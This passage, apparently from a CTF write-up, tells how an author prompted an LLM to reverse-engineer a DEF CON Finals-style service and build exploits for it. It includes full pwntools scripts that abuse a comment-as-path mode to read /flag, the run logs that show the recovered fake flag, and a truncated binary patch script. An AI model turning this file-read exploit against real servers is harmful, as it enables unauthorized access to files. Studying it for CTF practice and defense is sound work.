<p>Okay you can now interact with it by running the python script, but I don’t think the exploit is working <img class="emoji" alt="frowning" src="data:image/png;base64,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" /></p>
</blockquote>
<h1 id="%E8%BF%91%E5%9C%A8%E5%92%AB%E5%B0%BA%E5%8F%88%E4%BC%BC%E9%81%A0%E5%9C%A8%E5%A4%A9%E9%82%8A">近在咫尺，又似遠在天邊</h1>
<blockquote>
<p>Please add a nice and clean parser!</p>
</blockquote>
<pre class="hljs"><code><div>from __future__ import annotations

from pwn import remote  # type: ignore
import os
import re
from typing import Dict, Tuple, Optional, List

# Protocol helpers -----------------------------------------------------------

def send_cmd(io, data: bytes) -&gt; None:
    io.send(data)


def read_exact(io, n: int, timeout: float = 2.0) -&gt; bytes:
    data = b&quot;&quot;
    while len(data) &lt; n:
        chunk = io.recv(n - len(data), timeout=timeout)
        if not chunk:
            break
        data += chunk
    return data


def read_chunk(io, timeout: float = 2.0) -&gt; Optional[Tuple[int, bytes]]:
    &quot;&quot;&quot;Read one server chunk: 1-byte tag + 2-byte little-endian length + payload.&quot;&quot;&quot;
    hdr = read_exact(io, 3, timeout=timeout)
    if len(hdr) &lt; 3:
        return None
    tag = hdr[0]
    length = hdr[1] | (hdr[2] &lt;&lt; 8)
    payload = read_exact(io, length, timeout=timeout)
    if len(payload) &lt; length:
        return None
    return tag, payload


# Response parsing -----------------------------------------------------------

PRINTABLE_RE = re.compile(rb&quot;[ -~]{1,256}&quot;)


def tokenize_printables(data: bytes) -&gt; List[bytes]:
    return [m.group(0) for m in PRINTABLE_RE.finditer(data)]


def parse_png_text_chunks(payload: bytes) -&gt; Dict[str, str]:
    &quot;&quot;&quot;Parse PNG tEXt chunks into a dict of key-&gt;value.

    PNG layout: 8-byte signature, then repeated [length(4 BE), type(4), data, crc(4)].
    For type 'tEXt', data is keyword(ASCII) + 0x00 + text(ISO-8859-1/ASCII).
    &quot;&quot;&quot;
    out: Dict[str, str] = {}
    # PNG signature
    if not (len(payload) &gt;= 8 and payload[:8] == b&quot;\x89PNG\r\n\x1a\n&quot;):
        return out
    off = 8
    while off + 12 &lt;= len(payload):
        length = int.from_bytes(payload[off : off + 4], &quot;big&quot;)
        ctype = payload[off + 4 : off + 8]
        off += 8
        if off + length + 4 &gt; len(payload):
            break
        data = payload[off : off + length]
        off += length
        crc = payload[off : off + 4]
        off += 4
        if ctype == b&quot;tEXt&quot;:
            try:
                if b&quot;\x00&quot; in data:
                    key, value = data.split(b&quot;\x00&quot;, 1)
                    k = key.decode(&quot;latin-1&quot;, errors=&quot;ignore&quot;)
                    v = value.decode(&quot;latin-1&quot;, errors=&quot;ignore&quot;)
                    if k:
                        out[k] = v
            except Exception:
                pass
        if ctype == b&quot;IEND&quot;:
            break
    return out


def parse_kv_payload(payload: bytes) -&gt; Dict[str, str]:
    &quot;&quot;&quot;Best-effort parse of a key/value bundle produced by opcode 0x32.

    The server serializes a small structure with fields like &quot;Author&quot;, &quot;Comment&quot;,
    and &quot;Software&quot; using an internal container format. We conservatively scan the
    payload for printable tokens and map well-known keys to the token that follows.
    &quot;&quot;&quot;
    # First, handle PNG tEXt-encoded bundles, which the server commonly emits
    # (Author/Software are stored as PNG text chunks).
    png = parse_png_text_chunks(payload)
    if png:
        return png

    tokens = tokenize_printables(payload)
    keys = {b&quot;Author&quot;, b&quot;Comment&quot;, b&quot;Software&quot;}
    out: Dict[str, str] = {}
    for i, tok in enumerate(tokens):
        # Allow cases like 'tEXtAuthor' by checking substring containment
        matched_key: Optional[bytes] = None
        for k in keys:
            if tok == k or (k in tok):
                matched_key = k
                break
        if matched_key and i + 1 &lt; len(tokens):
            # Prefer the very next printable token as the value
            key = matched_key.decode(&quot;ascii&quot;, errors=&quot;ignore&quot;)
            val = tokens[i + 1].decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)
            # Guard against obviously invalid huge values
            if len(val) &gt; 0:
                out[key] = val
    return out


# Exploit flow ---------------------------------------------------------------

def exploit_fetch_metadata(io) -&gt; Tuple[Optional[Dict[str, str]], bytes]:
    # 0x10: enable session; 0x22: build default entry with flag in Author; 0x32 x01: request bundle
    send_cmd(io, b&quot;\x10&quot;)
    io.recv(timeout=1.1)  # ignore 1-byte ack if present
    send_cmd(io, b&quot;\x22&quot;)
    io.recv(timeout=1.1)
    send_cmd(io, b&quot;\x32\x01&quot;)

    chunk = read_chunk(io, timeout=2.0)
    if not chunk:
        return None, b&quot;&quot;
    tag, payload = chunk
    parsed = parse_kv_payload(payload)
    return parsed, payload


def main():
    host = os.environ.get(&quot;HOST&quot;, &quot;127.0.0.1&quot;)
    port = int(os.environ.get(&quot;PORT&quot;, &quot;4265&quot;))
    io = remote(host, port)
    try:
        kv, raw = exploit_fetch_metadata(io)
        if kv:
            print(&quot;Parsed fields:&quot;)
            for k in (&quot;Author&quot;, &quot;Comment&quot;, &quot;Software&quot;):
                if k in kv:
                    print(f&quot;- {k}: {kv[k]}&quot;)
            if &quot;Author&quot; in kv:
                print(f&quot;\nAuthor (likely flag): {kv['Author']}&quot;)
        else:
            print(f&quot;No parsable KV bundle. Raw chunk ({len(raw)} bytes): {raw.hex()}&quot;)
    finally:
        try:
            send_cmd(io, b&quot;\x11&quot;)  # close session politely
        except Exception:
            pass
        io.close()


if __name__ == &quot;__main__&quot;:
    main()

</div></code></pre>
<pre class="hljs"><code><div>[x] Opening connection to 127.0.0.1 on port 4265
[x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4265: Done
Parsed fields:
- Author: 1B5B55E424237B0FF70D2DAE6D79F226
- Software: ico v0.1

Author (likely flag): 1B5B55E424237B0FF70D2DAE6D79F226
[*] Closed connection to 127.0.0.1 port 4265
</div></code></pre>
<p>我們還是沒拿到 flag，但至少輸出看起來已經很像回事了。</p>
<blockquote>
<p>接著我明確告訴它這不是 flag，我在 docker 裡用了假的旗標 @flag，並提供實際的假旗標字串作參考（flag{WINNER_WINNER_CHICKEN_DINNER}）。
This is not the flag, I’m using a fake flag @flag that gets loaded into the docker</p>
</blockquote>
<h1 id="%E9%AD%94%E6%B3%95%E6%99%82%E5%88%BB">魔法時刻</h1>
<pre class="hljs"><code><div>Evidence:
Your extract: Author = 1B5B55E424237B0FF70D2DAE6D79F226

MD5(flag{WINNER_WINNER_CHICKEN_DINNER}) = 1B5B55E424237B0FF70D2DAE6D79F226 (matches)
</div></code></pre>
<p>證據：你抽取到的 Author 為 1B5B55E424237B0FF70D2DAE6D79F226；而 MD5(flag{WINNER_WINNER_CHICKEN_DINNER}) 等於 1B5B55E424237B0FF70D2DAE6D79F226，完全匹配。</p>
<pre class="hljs"><code><div>echo -en 'flag{WINNER_WINNER_CHICKEN_DINNER}' | md5sum
1b5b55e424237b0ff70d2dae6d79f226  -
</div></code></pre>
<p>一開始我以為這是幻覺，怎麼會是 MD5？之前逆向的同伴沒看到，我自己在二進位裡也沒看到任何與 MD5 相關的東西，也許我們只是沒看夠仔細。
在主控台實測 md5sum 之後，結果吻合，讓我大為震驚；LLM 正確推斷這是 MD5，但只是在看到原始旗標之後才做到的，之前它本可早點建立這樣的連結，但也許在得到真旗標後它決定呼叫工具來驗證而不是猜測。</p>
<blockquote>
<p>這很酷——但我們仍然沒有明文 flag。
Awesome! That’s cool! Can you update ida functions to reflect this new info?</p>
</blockquote>
<p>我再度讓它更新反編譯，以便利用這個新資訊來指導後續的決策，之後第二則訊息請它把利用腳本調整到能拿到 flag，因為 MD5 沒用，我們要明文。</p>
<h1 id="%E5%88%A9%E7%94%A8%E8%85%B3%E6%9C%AC%E7%9C%9F%E6%AD%A3%E6%8B%BF%E5%88%B0%E6%98%8E%E6%96%87">利用腳本（真正拿到明文）</h1>
<pre class="hljs"><code><div>from __future__ import annotations

from pwn import remote  # type: ignore
from pwn import p16     # type: ignore
import os
import re
from typing import Dict, Tuple, Optional, List


# Protocol helpers -----------------------------------------------------------

def send_cmd(io, data: bytes) -&gt; None:
    io.send(data)


def read_exact(io, n: int, timeout: float = 2.0) -&gt; bytes:
    data = b&quot;&quot;
    while len(data) &lt; n:
        chunk = io.recv(n - len(data), timeout=timeout)
        if not chunk:
            break
        data += chunk
    return data


def read_chunk(io, timeout: float = 2.0) -&gt; Optional[Tuple[int, bytes]]:
    &quot;&quot;&quot;Read one server chunk: 1-byte tag + 2-byte little-endian length + payload.&quot;&quot;&quot;
    hdr = read_exact(io, 3, timeout=timeout)
    if len(hdr) &lt; 3:
        return None
    tag = hdr[0]
    length = hdr[1] | (hdr[2] &lt;&lt; 8)
    payload = read_exact(io, length, timeout=timeout)
    if len(payload) &lt; length:
        return None
    return tag, payload


def send_length_prefixed_blob(io, data: bytes) -&gt; None:
    io.send(p16(len(data), endian=&quot;little&quot;) + data)


# Response parsing -----------------------------------------------------------

PRINTABLE_RE = re.compile(rb&quot;[ -~]{1,256}&quot;)


def tokenize_printables(data: bytes) -&gt; List[bytes]:
    return [m.group(0) for m in PRINTABLE_RE.finditer(data)]


def parse_png_text_chunks(payload: bytes) -&gt; Dict[str, str]:
    &quot;&quot;&quot;Parse PNG tEXt chunks into a dict of key-&gt;value.

    PNG layout: 8-byte signature, then repeated [length(4 BE), type(4), data, crc(4)].
    For type 'tEXt', data is keyword(ASCII) + 0x00 + text(ISO-8859-1/ASCII).
    &quot;&quot;&quot;
    out: Dict[str, str] = {}
    # PNG signature
    if not (len(payload) &gt;= 8 and payload[:8] == b&quot;\x89PNG\r\n\x1a\n&quot;):
        return out
    off = 8
    while off + 12 &lt;= len(payload):
        length = int.from_bytes(payload[off : off + 4], &quot;big&quot;)
        ctype = payload[off + 4 : off + 8]
        off += 8
        if off + length + 4 &gt; len(payload):
            break
        data = payload[off : off + length]
        off += length
        crc = payload[off : off + 4]
        off += 4
        if ctype == b&quot;tEXt&quot;:
            try:
                if b&quot;\x00&quot; in data:
                    key, value = data.split(b&quot;\x00&quot;, 1)
                    k = key.decode(&quot;latin-1&quot;, errors=&quot;ignore&quot;)
                    v = value.decode(&quot;latin-1&quot;, errors=&quot;ignore&quot;)
                    if k:
                        out[k] = v
            except Exception:
                pass
        if ctype == b&quot;IEND&quot;:
            break
    return out


def parse_kv_payload(payload: bytes) -&gt; Dict[str, str]:
    &quot;&quot;&quot;Best-effort parse of a key/value bundle produced by opcode 0x32.

    The server serializes a small structure with fields like &quot;Author&quot;, &quot;Comment&quot;,
    and &quot;Software&quot; using an internal container format. We conservatively scan the
    payload for printable tokens and map well-known keys to the token that follows.
    &quot;&quot;&quot;
    # First, handle PNG tEXt-encoded bundles, which the server commonly emits
    # (Author/Software are stored as PNG text chunks).
    png = parse_png_text_chunks(payload)
    if png:
        return png

    tokens = tokenize_printables(payload)
    keys = {b&quot;Author&quot;, b&quot;Comment&quot;, b&quot;Software&quot;}
    out: Dict[str, str] = {}
    for i, tok in enumerate(tokens):
        # Allow cases like 'tEXtAuthor' by checking substring containment
        matched_key: Optional[bytes] = None
        for k in keys:
            if tok == k or (k in tok):
                matched_key = k
                break
        if matched_key and i + 1 &lt; len(tokens):
            # Prefer the very next printable token as the value
            key = matched_key.decode(&quot;ascii&quot;, errors=&quot;ignore&quot;)
            val = tokens[i + 1].decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)
            # Guard against obviously invalid huge values
            if len(val) &gt; 0:
                out[key] = val
    return out


# Exploit flow ---------------------------------------------------------------

def exploit_fetch_metadata(io) -&gt; Tuple[Optional[Dict[str, str]], bytes]:
    # 0x10: enable session; 0x22: build default entry with flag in Author; 0x32 x01: request bundle
    send_cmd(io, b&quot;\x10&quot;)
    io.recv(timeout=1.1)  # ignore 1-byte ack if present
    send_cmd(io, b&quot;\x22&quot;)
    io.recv(timeout=1.1)
    send_cmd(io, b&quot;\x32\x01&quot;)

    chunk = read_chunk(io, timeout=2.0)
    if not chunk:
        return None, b&quot;&quot;
    tag, payload = chunk
    parsed = parse_kv_payload(payload)
    return parsed, payload


def exploit_fetch_flag_via_comment(io) -&gt; bytes:
    &quot;&quot;&quot;Abuse comment type=2 (path) to read /flag plaintext and return it.&quot;&quot;&quot;
    # 0x10: enable
    send_cmd(io, b&quot;\x10&quot;)
    io.recv(timeout=0.5)
    # 0x22: create default entry (comment type preset to 2)
    send_cmd(io, b&quot;\x22&quot;)
    io.recv(timeout=0.5)
    # 0x31: set comment to path &quot;/flag&quot; (length-prefixed blob)
    send_cmd(io, b&quot;\x31&quot;)
    send_length_prefixed_blob(io, b&quot;/flag&quot;)
    io.recv(timeout=0.5)
    # 0x30: get comment value; server returns a tagged blob containing file contents
    send_cmd(io, b&quot;\x30&quot;)
    chunk = read_chunk(io, timeout=2.0)
    if not chunk:
        return b&quot;&quot;
    _tag, payload = chunk
    return payload


def main():
    host = os.environ.get(&quot;HOST&quot;, &quot;127.0.0.1&quot;)
    port = int(os.environ.get(&quot;PORT&quot;, &quot;4265&quot;))
    io = remote(host, port)
    try:
        # First path: MD5-hex via PNG metadata bundle
        kv, raw = exploit_fetch_metadata(io)
        if kv:
            print(&quot;Parsed fields:&quot;)
            for k in (&quot;Author&quot;, &quot;Comment&quot;, &quot;Software&quot;):
                if k in kv:
                    print(f&quot;- {k}: {kv[k]}&quot;)
            if &quot;Author&quot; in kv:
                print(f&quot;\nAuthor (MD5 of flag): {kv['Author']}&quot;)
        else:
            print(f&quot;No parsable KV bundle. Raw chunk ({len(raw)} bytes)&quot;)

        # Second path: plaintext flag via comment-as-path trick
        try:
            plain = exploit_fetch_flag_via_comment(io)
            if plain:
                print(f&quot;\nPlaintext flag via comment: {plain.decode('utf-8', errors='ignore')}&quot;)
            else:
                print(&quot;\nFailed to fetch plaintext flag via comment.&quot;)
        except Exception as e:
            print(f&quot;\nError fetching plaintext flag via comment: {e}&quot;)
    finally:
        try:
            send_cmd(io, b&quot;\x11&quot;)  # close session politely
        except Exception:
            pass
        io.close()


if __name__ == &quot;__main__&quot;:
    main()

</div></code></pre>
<pre class="hljs"><code><div>[x] Opening connection to 127.0.0.1 on port 4265
[x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4265: Done
Parsed fields:
- Author: 1B5B55E424237B0FF70D2DAE6D79F226
- Software: ico v0.1

Author (MD5 of flag): 1B5B55E424237B0FF70D2DAE6D79F226

Plaintext flag via comment: flag{WINNER_WINNER_CHICKEN_DINNER}

[*] Closed connection to 127.0.0.1 port 4265
</div></code></pre>
<p>我跑腳本後的第一個念頭是：LLM 作弊了，我以為它在做「獎勵駭入（reward hacking）」，只是開了我本機的檔案。
但我讀了兩遍程式碼，然後找了三位隊友也跑了這段程式碼，結果都證實：它真的有效。
在最少的人力投入之下，我靠著不斷提問、推促、請求，讓 LLM 為一題 DEF CON 決賽等級的挑戰做出可用的利用。</p>
<p>由寫出這段利用的 LLM 來解釋最後的利用再適合不過：</p>
<pre class="hljs"><code><div>0x10 enables the session (ACK).
0x22 creates a default entry: it sets type at offset +48 to 2 (path mode), Author to g_FlagString (MD5-hex of /flag), Software to &quot;ico v0.1&quot;.
0x31 length-prefixed blob sets the Comment value at offset +56 (we send &quot;/flag&quot;).
0x30 returns the Comment. Because type==2, the server treats Comment as a path and returns file contents → plaintext flag.
</div></code></pre>
<h1 id="%E4%BF%AE%E8%A3%9Cthe-patch">修補（The Patch）</h1>
<p>DEF CON 決賽是攻防賽，既然有利用就要防禦它，於是我直接問 LLM，結果只花了兩個提示就拿到解法與補丁腳本。
它的核心做法是把 VA 0x45F24D 那條「mov byte [*+0x30], 0x2」指令的立即數從 0x2 改成 0x1，把預設 comment 類型從 PATH(2) 改為 LITERAL(1)，以純 Python 腳本計算 ELF 對映並覆寫單一位元即可。</p>
<pre class="hljs"><code><div>#!/usr/bin/env python3
&quot;&quot;&quot;
Minimal, pure-Python patcher for 'ico' to disable comment-as-path default.

It flips the immediate '2' -&gt; '1' in the instruction at VA 0x45F24D:
    mov byte [&lt;obj&gt;+0x30], 0x2   ; sets comment type to PATH (2)
We change the imm8 to 0x1 so comment type defaults to LITERAL (1).

Implementation details:
- Computes file offset of the VA via ELF program headers (PT_LOAD mapping)
- Writes one byte at (file_off + 3), since the encoding is: C6 .. .. &lt;imm8&gt;

Usage:
  python3 patch_simple.py /path/to/ico
Creates /path/to/ico.bak backup.
&quot;&quot;&quot;

import os
import shutil
import struct
import sys
from typing import Tuple


TARGET_VA = 0x45F24D  # start of 'mov byte [*+0x30], 0x2'
IMM_DELTA = 3         # imm8 is the 4th byte in typical encoding C6 ?? disp8 imm8


def elf64_read_phdr_mapping(f) -&gt; Tuple[int, int, int]:
    f.seek(0)
    ehdr = f.read(0x40)
    if len(ehdr) &lt; 0x40 or ehdr[:4] != b&quot;\x7fELF&quot;:
        raise RuntimeError(&quot;not an ELF file&quot;)
    ei_class = ehdr[4]
    ei_data = ehdr[5]
    if ei_class != 2 or ei_data != 1:
        raise RuntimeError(&quot;expected ELF64 little-endian&quot;)
    e_phoff = struct.unpack_from(&quot;&lt;Q&quot;, ehdr, 0x20)[0]
    e_phentsize = struct.unpack_from(&quot;&lt;H&quot;, ehdr, 0x36)[0]
    e_phnum = struct.unpack_from(&quot;&lt;H&quot;, ehdr, 0x38)[0]

    for i in range(e_phnum):
        f.seek(e_phoff + i * e_phentsize)
        ph = f.read(e_phentsize)
        if len(ph) &lt; e_phentsize:
            break
        p_type = struct.unpack_from(&quot;&lt;I&quot;, ph, 0x00)[0]
        if p_type != 1:  # PT_LOAD
            continue
        p_offset = struct.unpack_from(&quot;&lt;Q&quot;, ph, 0x08)[0]
        p_vaddr = struct.unpack_from(&quot;&lt;Q&quot;, ph, 0x10)[0]
        p_filesz = struct.unpack_from(&quot;&lt;Q&quot;, ph, 0x20)[0]
        p_memsz = struct.unpack_from(&quot;&lt;Q&quot;, ph, 0x28)[0]
        if p_vaddr &lt;= TARGET_VA &lt; p_vaddr + p_memsz:
            return p_offset, p_vaddr, p_filesz
